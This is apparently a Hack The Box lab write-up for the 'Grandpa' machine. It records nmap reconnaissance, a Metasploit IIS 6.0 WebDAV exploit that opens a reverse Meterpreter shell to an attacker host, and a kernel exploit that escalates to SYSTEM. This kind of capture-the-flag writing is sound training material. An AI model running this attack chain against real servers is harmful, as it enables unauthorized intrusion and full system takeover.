# GRANDPA

## NMAP

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/grandpa]
└─$ nmap 10.10.10.14                  
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-09 02:19 EDT
Nmap scan report for 10.10.10.14
Host is up (0.27s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 27.19 seconds
                                                                                               
┌──(kali㉿kali)-[~/Downloads/hackthebox/grandpa]
└─$ nmap 10.10.10.14 -p 80 -A
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-09 02:20 EDT
Nmap scan report for 10.10.10.14
Host is up (0.26s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Error
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Server Date: Sat, 09 Oct 2021 06:33:34 GMT
|   Server Type: Microsoft-IIS/6.0
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## WEBSITE

![](https://github.com/Leo-2807/Writeups/blob/main/images/grandpa1.png)

## SHELL

Using metasploit to search for microsoft iis exploits I found one that worked.

```bash
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > exploit

[*] Started reverse TCP handler on 10.10.14.4:4444 
[*] Trying path length 3 to 60 ...
[*] Sending stage (175174 bytes) to 10.10.10.14
[*] Meterpreter session 3 opened (10.10.14.4:4444 -> 10.10.10.14:1030) at 2021-10-09 02:48:26 -0400

meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
...snip...
 1896  584   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
...snip...
meterpreter > migrate 1896
[*] Migrating from 2236 to 1896...
[*] Migration completed successfully.
meterpreter > getuid
Server username: NT AUTHORITY\NETWORK SERVICE
meterpreter > background
[*] Backgrounding session 3...
```

## PRIVESEC

Looking for some local exploits for this machine.

```bash
msf6 post(multi/recon/local_exploit_suggester) > exploit

[*] 10.10.10.14 - Collecting local exploits for x86/windows...
[*] 10.10.10.14 - 38 exploit checks are being tried...
[+] 10.10.10.14 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.14 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.14 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
```

Using one of these exploits

```bash
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms14_058_track_popup_menu
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
...snip...
msf6 exploit(windows/local/ms14_058_track_popup_menu) > set SESSION 3
SESSION => 3
msf6 exploit(windows/local/ms14_058_track_popup_menu) > 
msf6 exploit(windows/local/ms14_058_track_popup_menu) > set LHOST tun0
LHOST => tun0
msf6 exploit(windows/local/ms14_058_track_popup_menu) > exploit

[*] Started reverse TCP handler on 10.10.14.4:4444 
[*] Launching notepad to host the exploit...
[+] Process 2344 launched.
[*] Reflectively injecting the exploit DLL into 2344...
[*] Injecting exploit into 2344...
[*] Exploit injected. Injecting payload into 2344...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (175174 bytes) to 10.10.10.14
[*] Meterpreter session 4 opened (10.10.14.4:4444 -> 10.10.10.14:1031) at 2021-10-09 03:05:10 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Now we can easily look for user.txt and root.txt
